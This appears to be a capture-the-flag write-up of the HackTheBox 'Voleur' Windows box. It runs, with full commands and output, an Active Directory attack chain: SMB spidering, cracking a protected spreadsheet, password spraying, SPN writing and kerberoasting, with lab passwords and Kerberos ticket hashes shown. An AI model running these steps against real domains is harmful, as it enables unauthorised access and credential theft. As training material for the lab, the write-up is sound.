---
layout: post
title: "week 8 voleur"
date: 2025-07-12 00:00:00 -0700
categories: challenges
description: "Voleur is a Windows box that has a samba share with a password protected xlsx doc that can be bruteforced to give access to service accounts. The service accounts allow for SPN writing and kerberoasting to get to user. With those permissions we can resurrect a removed user which has stored credentials to level 3 which has an ssh key to WSL which can get to the backup data in the depths of L3. From there a secretsdump reveals the admin hashes."
parent: HackTheBox - Season 8
grand_parent: Challenges
event: "htb-season-8"
tags:
- "samba"
- "windows"
- "medium"
- "backups"
- "wsl"
- "kerberoasting"
---
# week8-voleur

## Engagement Notes
As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt

Another traditional Windows-only service with the goal of climbing a samba permission ladder. Starting with the first user, we can authenticate to the samba share to dump a password protected xlsx doc that can be bruteforced to give access to service accounts. The service accounts allow for SPN writing and kerberoasting to get to user. With those permissions we can resurrect a removed user which has stored credentials to level 3 which has an ssh key to WSL which can get to the backup data in the depths of L3. From there a secretsdump reveals the admin hashes.

# Enumeration

### Set variables and baseline functions for further engagement


```python
from utils import * # Use `widget.summary()` to get all the premade code blocks

source =! ip address | grep tun | grep 10 | tr "/" " " | awk '{print $2}'
public_source = requests.get('https://ifconfig.co/ip').text
target = 'voleur.htb'

print(f"source: {source}")
print(f"target: {target}")
```

    source: ['10.10.14.81']
    target: voleur.htb


> Just some values for our ease of scripting out the initial enumerations.


```python
initialuser = 'ryan.naylor'
initialpass = 'HollowOct31Nyt'
```

## Network Enumeration

I've found that all Windows engagements might as well have Bloodhound ready to go. ldeep has been useful in generating lists for quick tool usage, but Bloodhound is a necessity for crawling through AD sludge.


```python
!mkdir -p ./bloodhounddumps
!docker compose --project-directory ~/.local/build/programs/bloodhound --progress quiet down --volumes
!docker compose --project-directory ~/.local/build/programs/bloodhound --progress quiet up -d
```


```python
!rustscan -a $target
```

    .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
    | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
    | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
    `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
    The Modern Day Port Scanner.
    ________________________________________
    : http://discord.skerritt.blog         :
    : https://github.com/RustScan/RustScan :
     --------------------------------------
    Port scanning: Because every port has a story to tell.
    
    [~] The config file is expected to be at "/home/tokugero/.rustscan.toml"
    [~] File limit higher than batch size. Can increase speed by increasing batch size '-b 524188'.
    Open 10.129.28.61:53
    Open 10.129.28.61:88
    Open 10.129.28.61:135
    Open 10.129.28.61:139
    Open 10.129.28.61:389
    Open 10.129.28.61:445
    Open 10.129.28.61:464
    Open 10.129.28.61:593
    Open 10.129.28.61:636
    Open 10.129.28.61:2222
    Open 10.129.28.61:3268
    Open 10.129.28.61:3269
    Open 10.129.28.61:5985
    Open 10.129.28.61:9389
    Open 10.129.28.61:49664
    Open 10.129.28.61:49667
    Open 10.129.28.61:49670
    Open 10.129.28.61:49671
    Open 10.129.28.61:57761
    Open 10.129.28.61:57775
    [~] Starting Script(s)
    [~] Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-05 20:11 -0700
    Initiating Ping Scan at 20:11
    Scanning 10.129.28.61 [2 ports]
    Completed Ping Scan at 20:11, 3.00s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 20:11
    Completed Parallel DNS resolution of 1 host. at 20:11, 4.00s elapsed
    DNS resolution of 1 IPs took 4.00s. Mode: Async [#: 2, OK: 0, NX: 0, DR: 1, SF: 0, TR: 4, CN: 0]
    Nmap scan report for 10.129.28.61 [host down, received no-response]
    Read data files from: /nix/store/wgw89vb58b7xdp5zk2r9fqy2qq3xxdd6-nmap-7.97/bin/../share/nmap
    Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
    Nmap done: 1 IP address (0 hosts up) scanned in 7.03 seconds
    


These are all pretty common AD ports, but 2222 stands out.


```python
!nmap -sC -Pn -p 2222 $target
```

    Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-06 17:32 -0700
    Nmap scan report for voleur.htb (10.129.26.94)
    Host is up (0.10s latency).
    
    PORT     STATE SERVICE
    2222/tcp open  EtherNetIP-1
    | ssh-hostkey: 
    |   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
    |   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
    |_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
    
    Nmap done: 1 IP address (1 host up) scanned in 9.92 seconds



```python
!ssh $initialuser@$target -p 2222 "whoami"
```

    ryan.naylor@voleur.htb: Permission denied (publickey).


We see that it's an SSH service, but it only allows key based authentication. Maybe we'll need to come back to this later.

## Windows Enumeration
My go-tos, enum4linux-ng, ldapsearch, ldeep, smbclient


```python
!enum4linux-ng -u $initialuser -p $initialpass $target -w $target
```

    ENUM4LINUX - next generation (v1.3.4)
    
     ==========================
    |    Target Information    |
     ==========================
    [*] Target ........... voleur.htb
    [*] Username ......... 'ryan.naylor'
    [*] Random Username .. 'nffwlbph'
    [*] Password ......... 'HollowOct31Nyt'
    [*] Timeout .......... 5 second(s)
    
     ===================================
    |    Listener Scan on voleur.htb    |
     ===================================
    [*] Checking LDAP
    [+] LDAP is accessible on 389/tcp
    [*] Checking LDAPS
    [+] LDAPS is accessible on 636/tcp
    [*] Checking SMB
    [+] SMB is accessible on 445/tcp
    [*] Checking SMB over NetBIOS
    [+] SMB over NetBIOS is accessible on 139/tcp
    
     ==================================================
    |    Domain Information via LDAP for voleur.htb    |
     ==================================================
    [*] Trying LDAP
    [+] Appears to be root/parent DC
    [+] Long domain name is: voleur.htb
    
     =========================================================
    |    NetBIOS Names and Workgroup/Domain for voleur.htb    |
     =========================================================
    [-] Could not get NetBIOS names information via 'nmblookup': timed out
    
     =======================================
    |    SMB Dialect Check on voleur.htb    |
     =======================================
    [*] Trying on 445/tcp
    [+] Supported dialects and settings:
    Supported dialects:
      SMB 1.0: false
      SMB 2.02: true
      SMB 2.1: true
      SMB 3.0: true
      SMB 3.1.1: true
    Preferred dialect: SMB 3.0
    SMB1 only: false
    SMB signing required: true
    
     =========================================================
    |    Domain Information via SMB session for voleur.htb    |
     =========================================================
    [*] Enumerating via unauthenticated SMB session on 445/tcp
    [-] Could not enumerate domain information via unauthenticated SMB
    [*] Enumerating via unauthenticated SMB session on 139/tcp
    [-] SMB connection error on port 139/tcp: session failed
    
     =======================================
    |    RPC Session Check on voleur.htb    |
     =======================================
    [*] Check for null session
    [-] Could not establish null session: STATUS_NOT_SUPPORTED
    [*] Check for user session
    [-] Could not establish user session: STATUS_NOT_SUPPORTED
    [*] Check for random user
    [-] Could not establish random user session: STATUS_NOT_SUPPORTED
    [-] Sessions failed, neither null nor user sessions were possible
    
     =============================================
    |    OS Information via RPC for voleur.htb    |
     =============================================
    [*] Enumerating via unauthenticated SMB session on 445/tcp
    [+] Found OS information via SMB
    [*] Enumerating via 'srvinfo'
    [-] Skipping 'srvinfo' run, not possible with provided credentials
    [+] After merging OS information we have the following result:
    OS: unknown
    OS version: not supported
    OS release: null
    OS build: null
    Native OS: not supported
    Native LAN manager: not supported
    Platform id: null
    Server type: null
    Server type string: null
    
    [!] Aborting remainder of tests since sessions failed, rerun with valid credentials
    
    Completed after 14.48 seconds


Not able to use any default scans with this user. There may be some shenanigans configured with auth, we'll just try a few more angles on looking at the same data.


```python
!ldapsearch -x -H ldap://$target -D "{initialuser}@{target}" -b "DC=voleur,DC=htb" -w $initialpass

```

    # extended LDIF
    #
    # LDAPv3
    # base <DC=voleur,DC=htb> with scope subtree
    # filter: (objectclass=*)
    # requesting: ALL
    #
    
    # voleur.htb
    dn: DC=voleur,DC=htb
    objectClass: top
    objectClass: domain
    objectClass: domainDNS
    distinguishedName: DC=voleur,DC=htb
    instanceType: 5
    whenCreated: 20250129084223.0Z
    whenChanged: 20250706030043.0Z
    subRefs: DC=ForestDnsZones,DC=voleur,DC=htb
    subRefs: DC=DomainDnsZones,DC=voleur,DC=htb
    <snip>
    
    # search result
    search: 2
    result: 0 Success
    
    # numResponses: 265
    # numEntries: 261
    # numReferences: 3
```

Finally can look through LDAP, let's use that same access to do our first bloodhound dump.


```python
!bloodhound-python -u $initialuser -p $initialpass -d $target -ns 10.129.28.61 -c All
```
```log
    INFO: Found AD domain: voleur.htb
    INFO: Getting TGT for user
    INFO: Connecting to LDAP server: dc.voleur.htb
    INFO: Found 1 domains
    INFO: Found 1 domains in the forest
    INFO: Found 1 computers
    INFO: Connecting to LDAP server: dc.voleur.htb
    INFO: Found 12 users
    INFO: Found 56 groups
    INFO: Found 2 gpos
    INFO: Found 5 ous
    INFO: Found 19 containers
    INFO: Found 0 trusts
    INFO: Starting computer enumeration with 10 workers
    INFO: Querying computer: DC.voleur.htb
    INFO: Done in 00M 20S
```

Ldeep is also a good tool for visualizing simple enumeration through text. I've found this a useful supplement to bloodhound where: In bloodhound I need to know what I'm looking for to start. In ldeep I can quickly skim through the generated lists to find what I might be looking for. It's also a helpful user list generator for other commands like kerbrute.


```python
!ldeep ldap -d voleur -u $initialuser -p $initialpass -t simple -b "DC=voleur,DC=htb" -s dc.$target all ldeep/voleur
```

    [+] Retrieving auth_policies output
    [+] Retrieving auth_policies verbose output
    [+] Retrieving bitlockerkeys output
    [+] Retrieving bitlockerkeys verbose output
    [+] Retrieving computers output
    [+] Retrieving conf output
    [+] Retrieving delegations output
    [+] Retrieving delegations verbose output
    [+] Retrieving delegations verbose output
    [+] Retrieving delegations verbose output
    [+] Retrieving delegations verbose output
    [+] Retrieving dns_records output
    [+] Domain records:
    [+] Forest records:
    [+] Legacy records:
    [+] Retrieving dns_records verbose output
    [+] Retrieving domain_policy output
    [+] Retrieving domain_policy verbose output
    [+] Retrieving fsmo output
    [+] Retrieving fsmo verbose output
    [+] Retrieving gmsa output
    [+] Retrieving gmsa verbose output
    [+] Retrieving gpo output
    [+] Retrieving gpo verbose output
    [+] Retrieving groups output
    [+] Retrieving groups verbose output
    [+] Retrieving machines output
    [+] Retrieving machines verbose output
    [+] Retrieving ou output
    [+] Retrieving ou verbose output
    [+] Retrieving pkis output
    [+] Retrieving pkis verbose output
    [+] Retrieving pso output
    [+] Retrieving sccm output
    [!] invalid attribute type mSSMSDefaultMP. Can't find SCCM management points
    [+] Retrieving sccm verbose output
    [!] invalid class in objectClass attribute: mssmsmanagementpoint. Can't find SCCM management points
    [+] Retrieving schema output
    [+] Retrieving server_info output
    [+] Retrieving server_info verbose output
    [+] Retrieving shadow_principals output
    [+] Retrieving shadow_principals verbose output
    [+] Retrieving silos output
    [+] Retrieving silos verbose output
    [+] Retrieving smsa output
    [+] Retrieving smsa verbose output
    [+] Retrieving subnets output
    [+] Retrieving subnets verbose output
    [+] Retrieving templates output
    [+] Retrieving templates verbose output
    [+] Retrieving trusts output
    [+] Retrieving trusts verbose output
    [+] Retrieving users output
    [+] Retrieving users verbose output
    [+] Retrieving users verbose output
    [+] Retrieving users verbose output
    [+] Retrieving users verbose output
    [+] Retrieving users verbose output
    [+] Retrieving users verbose output
    [+] Retrieving users verbose output
    [+] Retrieving users verbose output
    [+] Retrieving users verbose output
    [+] Retrieving users verbose output
    [+] Retrieving zones output
    [+] Domain zones:
    [+] Forest zones:
    [+] Retrieving zones verbose output


We'll accumulate our credentials in a `credentials` file. I want to make sure to always have a list of creds to check every auth against every cred in case of re-use.

Kerbrute here will also conveniently generate our kerberos ccaches, which we'll need to auth since it seems like our NTLM auth isn't going to work based on our failed enumeration scans.


```python
!kerbrute -domain $target -users ldeep/voleur_users_enabled.lst -password $initialpass
```

    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
    
    [*] Valid user => svc_winrm
    [*] Valid user => jeremy.combs
    [*] Valid user => svc_iis
    [*] Valid user => svc_backup
    [*] Valid user => svc_ldap
    [*] Valid user => lacey.miller
    [*] Valid user => marie.bryant
    [*] Stupendous => ryan.naylor:HollowOct31Nyt
    [*] Saved TGT in ryan.naylor.ccache
    [*] Valid user => Administrator


Always gotta do a little extra digging for vulnerable certs. Note that I'm using 4.8.2 here only because that's what's shipping with my OS, but note that as of this writing 5.0.3 is out and catches more ESCs


```python
!KRB5CCNAME=./ryan.naylor.ccache certipy find -k -no-pass -target dc.$target -stdout -scheme ldap
```

    Certipy v4.8.2 - by Oliver Lyak (ly4k)
    
    [*] Finding certificate templates
    [*] Found 0 certificate templates
    [*] Finding certificate authorities
    [*] Found 0 certificate authorities
    [*] Found 0 enabled certificate templates
    [*] Enumeration output:
    Certificate Authorities                 : [!] Could not find any CAs
    Certificate Templates                   : [!] Could not find any certificate templates


With our ccache, let's check samba again:


```python
!KRB5CCNAME=./ryan.naylor.ccache nxc smb -d $target --use-kcache -k dc.$target --shares
```

```
...
    SMB         dc.voleur.htb   445    dc.voleur.htb    Share           Permissions     Remark
    SMB         dc.voleur.htb   445    dc.voleur.htb    -----           -----------     ------
    SMB         dc.voleur.htb   445    dc.voleur.htb    ADMIN$                          Remote Admin
    SMB         dc.voleur.htb   445    dc.voleur.htb    C$                              Default share
    SMB         dc.voleur.htb   445    dc.voleur.htb    Finance                     
    SMB         dc.voleur.htb   445    dc.voleur.htb    HR                          
    SMB         dc.voleur.htb   445    dc.voleur.htb    IPC$            READ            Remote IPC
    SMB         dc.voleur.htb   445    dc.voleur.htb    IT              READ        
    SMB         dc.voleur.htb   445    dc.voleur.htb    NETLOGON        READ            Logon server share
    SMB         dc.voleur.htb   445    dc.voleur.htb    SYSVOL          READ            Logon server share
```


```python
!KRB5CCNAME=./ryan.naylor.ccache nxc smb -d $target --use-kcache -k dc.$target -M spider_plus -o DOWNLOAD_FLAG=True
```
```
...
    SMB         dc.voleur.htb   445    dc.voleur.htb    [*] Enumerated shares
    SMB         dc.voleur.htb   445    dc.voleur.htb    Share           Permissions     Remark
    SMB         dc.voleur.htb   445    dc.voleur.htb    -----           -----------     ------
    SMB         dc.voleur.htb   445    dc.voleur.htb    ADMIN$                          Remote Admin
    SMB         dc.voleur.htb   445    dc.voleur.htb    C$                              Default share
    SMB         dc.voleur.htb   445    dc.voleur.htb    Finance                     
    SMB         dc.voleur.htb   445    dc.voleur.htb    HR                          
    SMB         dc.voleur.htb   445    dc.voleur.htb    IPC$            READ            Remote IPC
    SMB         dc.voleur.htb   445    dc.voleur.htb    IT              READ        
    SMB         dc.voleur.htb   445    dc.voleur.htb    NETLOGON        READ            Logon server share
    SMB         dc.voleur.htb   445    dc.voleur.htb    SYSVOL          READ            Logon server share
...
    SPIDER_P... dc.voleur.htb   445    dc.voleur.htb    [*] Downloads successful: 7
    SPIDER_P... dc.voleur.htb   445    dc.voleur.htb    [+] All files processed successfully.
```

Our spiders found a file!


```python
!ls -alhn "./dc.voleur.htb/IT/First-Line Support/Access_Review.xlsx"
```

    -rw-r--r-- 1 1000 990 17K Jul  5 20:47 './dc.voleur.htb/IT/First-Line Support/Access_Review.xlsx'


That file is password encoded. Lets throw it at hashcat/john


```python
!office2john.py "./dc.voleur.htb/IT/First-Line Support/Access_Review.xlsx" | tee Access_Review.xlsx.hash
```

    Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833d<snip>



```python
!john Access_Review.xlsx.hash
```

```
    Warning: detected hash type "Office", but the string is also recognized as "office-opencl"
    Use the "--format=office-opencl" option to force loading these as that type instead
    Using default input encoding: UTF-8
    Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 SSE2 4x / SHA512 128/128 SSE2 2x AES])
    Cost 1 (MS Office version) is 2013 for all loaded hashes
    Cost 2 (iteration count) is 100000 for all loaded hashes
    Will run 8 OpenMP threads
    Proceeding with single, rules:Single
    Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
    Almost done: Processing the remaining buffered candidate passwords, if any.
    0g 0:00:04:43 DONE 1/3 (2025-07-05 20:55) 0g/s 123.6p/s 123.6c/s 123.6C/s Aaccess_review.xlsx1900..Xreview1900
    Proceeding with wordlist:/nix/store/ighvr1gf5m2lha2g4f3w63jzrm4s6w7x-john-rolling-2404/share/john/password.lst
    Enabling duplicate candidate password suppressor
    football1        (Access_Review.xlsx)     
    1g 0:00:05:03 DONE 2/3 (2025-07-05 20:56) 0.003299g/s 122.5p/s 122.5c/s 122.5C/s ilovegod..sayang
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed. 
```

Credential found: `football1`, classic corporate password.

![alt text](../../../assets/images/ctf/events/season8-htb-25/2025-07-12-week8-voleur.md/2025-07-12-week8-voleur/images/image.png)

Adding all these creds to our credentials list, and spraying again.


```python
!kerbrute -domain $target -users ldeep/voleur_users_enabled.lst -passwords credentials
```

    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
    
    [*] Valid user => svc_winrm
    [*] Valid user => jeremy.combs
    [*] Valid user => svc_iis
    [*] Valid user => svc_backup
    [*] Valid user => svc_ldap
    [*] Valid user => lacey.miller
    [*] Valid user => marie.bryant
    [*] Stupendous => ryan.naylor:HollowOct31Nyt
    [*] Saved TGT in ryan.naylor.ccache
    [*] Valid user => Administrator
    [*] Stupendous => svc_ldap:M1XyC9pW7qT5Vn
    [*] Saved TGT in svc_ldap.ccache
    [*] Stupendous => svc_iis:N5pXyW1VqM7CZ8
    [*] Saved TGT in svc_iis.ccache


Let's see what we can do with our newly acquired accounts.

![alt text](../../../assets/images/ctf/events/season8-htb-25/2025-07-12-week8-voleur.md/2025-07-12-week8-voleur/images/image-1.png)

GenericWrite to a user lets us write their SPN. WriteSPN to a service lets us update that SPN as well. I tried to use some tools that automagically set SPNs as part of the attack to do a kerberoast, but I ended up having to manually do this.

Setting our krb5.conf to our challenge. 


```python
!export KRB5_CONFIG=./krb5.conf
!cat ./krb5.conf
```

    [libdefaults]
            default_realm = VOLEUR.HTB 
            dns_lookup_kdc = true
            dns_lookup_realm = false
            ticket_lifetime = 24h
            renew_lifetime = 7d
            forwardable = true
            rdns = false
    [realms]
            VOLEUR.HTB = {
                    kdc = dc.voleur.htb
                    admin_server = dc.voleur.htb
            }
    
    [domain_realm]
            .voleur.htb = VOLEUR.HTB
            voleur.htb = VOLEUR.HTB


Let's set up our SPNs to do the kerberoast.


```python
!KRB5CCNAME=./svc_ldap.ccache bloodyAD -k --host dc.$target -d $target set object lacey.miller servicePrincipalName -v "host/lacey.miller"
!KRB5CCNAME=./svc_ldap.ccache bloodyAD -k --host dc.$target -d $target set object svc_winrm servicePrincipalName -v "host/svc_winrm"
```

    [+] lacey.miller's servicePrincipalName has been updated
    [+] svc_winrm's servicePrincipalName has been updated


This is two ways of doing the same thing. I prefer the nxc tool dumping the hashes to `roasted.lst`


```python
!KRB5CCNAME=./svc_ldap.ccache nxc ldap dc.$target -d $target --use-kcache -k --kerberoasting roasted.lst
```

    LDAP        dc.voleur.htb   389    DC.voleur.htb    [*]  x64 (name:DC.voleur.htb) (domain:voleur.htb) (signing:True) (SMBv1:False)
    LDAP        dc.voleur.htb   389    DC.voleur.htb    [+] voleur.htb\svc_ldap from ccache
    LDAP        dc.voleur.htb   389    DC.voleur.htb    [*] Total of records returned 2
    LDAP        dc.voleur.htb   389    DC.voleur.htb    sAMAccountName: lacey.miller memberOf: CN=Second-Line Technicians,DC=voleur,DC=htb pwdLastSet: 2025-01-29 01:20:10.758901 lastLogon:<never>
    LDAP        dc.voleur.htb   389    DC.voleur.htb    $krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$3777989b1f99ce7105ae64a44dd0b2c9$4ca9807bbb7d17b1e0d0ce9ba57f3a30fcebe6f8ebc6264665379394c6b0e5e8b1de940d2516d146f56e997ca1a72051f61ae606cc1afd723e47c9ba63b5d74b6c16a7accd89d160ec62662e3d79e83802b629edebf4e277739e7e88a5b2bd8cfe2b5639665111cfc4b3959590b7a5f84e2fdd4f5835189a9425b1b71a058ad2b1acbebd2ace10f8686fe806d89ac6723ff192be70e976b56c692f94f4fd297412bf0c7742ec040fad7890b06c17e56c149ff6940dcc08f24e05e101d661d05c781f12abc715789bee10172080ea5d5d77e6b21813b85f02af746f5f65a6ba33b89bde6071cfc4b875e40b9bef428120bb2d098e37a12da71696384d46958fc574c4743cd2da5aee11491d2391b25eaf1a7094746b852f4dbee190dfce8e8ddd22eef6dbf11f58c86e818c46d2dd76bcc1783251166587be5540e3fdf247dc5b5db5fc2e458c377971ddd88226cabb49a96b5e21d2db5eaebc5482be3917a9b3ee981928399c1c0f2595140e8b44704e0b3173cfb9e18697e92308b9e08ab09f79a65612efd8ff857472ec4f796227f78b40ad56b52835db1157f0907e66b1bf2f7145e7cfd9c43739fa0f342688c51ed75d970f90af66330db79d3c01869c6d9d0fae9a6d97f60fb6662316f64d3018fd0424bdfabcd29bfa266792a19b7d2d15b5e3896290b4d6dc8cfa48af7e5807fffb332e2ef25c547024fc7d11684b93e70611628d6d304030ef103fdd0ad1081716ed4438ead777cf125dc879b1b111a2a1d4a662c94770a589f279b4ba1a50eb19ef8c8054392289b48fc31cb032bef89065f94840d762ca65c03a498f7d4a2aae908e606a96617a4289f0ed58265c69d26bb42e1969d70da10664ebf05e7406c90364eeac74aa79967b27d4cc35e4c3e5e1dd1a63c21efd5c79b4c9b15807c5e15a564ba91997c228de1ac1bc576893c9a15fa92813efc90600ee95b756e48ddb28cc661797ca2cb93b02761cc6b956b3596dcdd7a082cbb29ecdd17919e1ab35e2bc83627f58dc9c527eabf7810cde39aac551832a0ab8876cf67bac5ed7125a6353eb14c4abc27f147eb83031a519edaf5f02039c440f053148a69458e6c4a873ce5f707b694d7faf065bf1dda0515c5bb3b05a4e9fe08a595efe3f2dbf3ae2f68d57b93f7d4eaaa5cb1e42722ec238a6dea3dd34e05b2c584dddf4e62b57b07ae9703403a48bca4be1c03d22d6c8f5ad063d88f20ec569aee2f67c04ed989fc543bc2fac921df904603ff1d2a0e78599cbf2c4ceaa9ddd09266a059a18f02c73c5fa68376945355ff75a1cf2135bdc734e989f1dda59b501c526fee0b881866abf2972714a14e725bc64420821207dc2ec02179348baa8c80cfe2c7dfc983497d488f6e301874b6f8ff537a551640c158abc2603a2af850d7c6fe3eb5bf25a0b5d650e20968def91f8e4b11cd87d76d5710b7295a868cbaf6f22779af62e2394
    LDAP        dc.voleur.htb   389    DC.voleur.htb    sAMAccountName: svc_winrm memberOf: CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb pwdLastSet: 2025-01-31 01:10:12.398769 lastLogon:2025-01-29 07:07:32.711487
    LDAP        dc.voleur.htb   389    DC.voleur.htb    $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$b07bc1c0b81567d7c0a04085148d590f$4fc57e6b9c9bad7b69ae74a2e6052df5cd78e37b76d0a591231596a10dc15207fd70d5f69443c8f202161ddd1aa773d5dcd7a00c1be699a9059b3c45a9ff0b9771d52cd3a2544677cedf9f483faaf5f1f5ff62ff895cf111325d73bd2291bbbfc9912e43ab4d53351ad4d5705b25520eff5433ca9d199c567d2a1121b4ec41dcdf61e9b343cb4640a04d2c96c670e4d5ab0c37ba54c90fc322a2ef2b82f8618159a48721cf644693386e8f24ef01309b47f77256fe648c019c6b1c9586eed78ef830223f3ffce0ff872345fc29b4eaa1c25cba809c15ec026ba89ec80aa2f8a6d24719f09712bee73894dac88ef98946887e8c07307b6646b50dfc3c64592c99fac18d2732fc927ce0b3752e4c32baaf6a7d2ff00bfb606384be745f6258713ea48001377a8e4d17eeb79eb250adbf8dab380fa3136bb6a7cfdc3cc5dc8311bfc8cf54ba16c56d03a2151aeae6fe1609807e1c1b5b40b9ade5355a9b49f3fe94f8b68d9e2bdcbe28af734aab25e19e62c264d14ccc6003cb89efe7ef61542d9db699b9f031ddb391d722ce7642c87377ede65fabe0231c171a97a937a84e6e8b969f968ce094fc925d68d450064507b914d26dddac571af7405d7f200664980aa48fbd57f30825f40b9b36e7e0b4df36bd674e7e0bd7936adcc04beb422050d473ae15a7f1dbc502c5ec027bed96cfc2bcd0faec00c8999829c617ada6e719cd342665c7099f01cee54e720c0cb06976abf4872b93c8f7ee473af70b6a48597ec7d8acd1c34940930421a4284c93631a3453aa8f97150dc32f5e0b8a94631d97d1d175c89b9ccdc3236492471dc85d3fa05fddbf6988a47223c8aa184f6714b1dea0a5b18a2aef744e825912c6eff733c18f927f2ab56dbb36576040f4f7ebf042123a4a994c3c1d72029c1292035cdd4532fe0732b28627b8c5c8c82ed04050b6de98046e1d6e6bdaf1e50873b7b9b24cb1273d6bbf3b7089caef39f9c2c30d31ff3da15f5eb6d8739dfe96f13d50d18fdc9583b73dd60e5619d6f0ab50774c37fbc4100820815039b14945a8d10668304449d607346cc6ecd7636565f79ac6529701a8959df5ce01be61e3a67e40453d60d4a835ff9787261790aa3e929c2193ac429a1867435a413830906566c470982763e4069aa545bc7543272239bf8fe275cf2b7ee8c4a48f97269901204d13aeed63e161bf7616a7815a97c91e6ff4922de0a336281191fddb5fcbeb0ecf8a9607dbca55f3203b33e05e9f286193c81ec6ae71c630d824f1e36aeb2f6a01e727a55ae84cb6992af593c30abf8ffc86b09c28682d8f29a1725baf537fdc21e34d02d258fd8244c63c935788f0caf60896dff9aa280e3c33595d43462151296a2a5ac600c552d88e62e5f1ee85d60a1cc8856961d9bd793cc8beb73875aecc3f0bcdc006ff0fe85a1a0c5982d8873898e76ef03c18f77bf612ab58418a2d891acdadc3



```python
!KRB5CCNAME=./svc_ldap.ccache GetUserSPNs.py -k -no-pass -dc-host dc.$target -request $target/svc_ldap
```

    /home/tokugero/ctf/htb/season8/week8-voleur/.venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
      import pkg_resources
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
    
    ServicePrincipalName  Name          MemberOf                                                PasswordLastSet             LastLogon                   Delegation 
    --------------------  ------------  ------------------------------------------------------  --------------------------  --------------------------  ----------
    host/lacey.miller     lacey.miller  CN=Second-Line Technicians,DC=voleur,DC=htb             2025-01-29 01:20:10.758901  <never>                                
    host/svc_winrm        svc_winrm     CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb  2025-01-31 01:10:12.398769  2025-01-29 07:07:32.711487             
    
    
    
    $krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$56c9753cf9679d9a445783301034eb21$23c5f170c2b3b9942a4489042553f583a9aad45962aae5a8881168d5c1eb025b1af05c0d027c5621eda03015a4c4824d0f59da0def066732e1154f74d0f624621fce846cee59475c6f6d9b24e0a20f17c9db42b626b0adfbc1823ee7de0cf81026ad38ea784873519bae8afdc8e9bb1483e1058bd2aea5534a1c41d724df3231f516fdc4bf6e1f74320c46b350229cb715d4775ffe0682700acbb6e5bf9f27293dccd546639d4d48150b28ae05172344e17ca0d1e6691c1b36340f5f4928ac130a2a98528e7f1e430e98eb6787b9b42fff7a86fbae290a01085f6ccf04fba313af454bc7a18a28d5bed0c849ac7defb517a57a40ef61d05f497bcf73a89429c8e719c9c491b491d15831d8ccf541d1a596ded952c128198194b16aa05b52ac7c688f773c6b2f287724e4466f4cdcadb64bba02c732761406aad0a3666caafda0e0105e7cb716ec28aede08e835849946fe5e2f1ecaf011a1b6a1e6e24753f431307b00f6acb3816df655e0bbf5aecfb5fe2cfb1dc2d2b5f2e856011849cb9956ddf241f3dc4c0044ab2a1de09047d3111556f90d6da8619de46235a4b67b5996c68b9ab711d0926c51b0250fc47d198567bc528f03e037fd6cfaf512a127c640231d761701db377ac50b8caa6a98151d514bd5c4e30f00b42d16dbeb098abc0ab2b2335d154a52175173702a87e99901cea4736399efabb8b89ede5339bbc720a1176eba55e258113b7546acfc1873dc2ae33c901a266138f866121c9b780ac4b7f2ed851fc440f13d961f5c622327123f01947fb0441363759d56b63e79dc2ab6672541d4951d32271f785735e19d1a00aa9af6c121f83a86be76f4a4f83ffe296c0ae604a2fefc3f7b144203e207783514365f7540aba42bcb4b2e6034535f44baa5c9ffc0b95d367a0d3bde5f6cebf1b2e8af596bf092c43ef36ad2e9bf9f451b42c3fa693b51dd77ab25d9437a35080afe7183e9bb8b0960838421e2dcb9f946859475fd58ca478560e0469a7d3ab5ccd321fc3a0ee75b1e9f2084e86bb88fe746c15fc6678d1ec6afd69256e8d7a04dd08f6ad4b49f8f8c6a84a11b994aeabc82ed48232dfe29121718997f1220ac14f3c3aa5c7e87ca35b4706a4c7bd57bdfbe163e593a88587eae13d23692d62a4f4de5852e68e0fbbb3d655c0a2f4ac5f100798d7f7e3da949ccff12fb7f46eb4cf754863ee762d54ebebdfeab2f49a537cab678b33f7b77dea31ccd9410ae5e9880c559493c46d87db522ea880208e55f2a39056dfd1896029c08beb8cd469bd475673b90867be251de09022ae3cba36b3f24b19035c39663c45f538ea82293d632d09982d64dd4e752a4bcc210364aee75fe65a6959f07e1d11c8fec790fc57de2bde60abbb80387248e289bbb36fca5cf60c30035a5337115c72cd8934338ac245e07bd09e409190a5186b53b01b889c6cb7252b1df59bddb08f75d2b96987bff
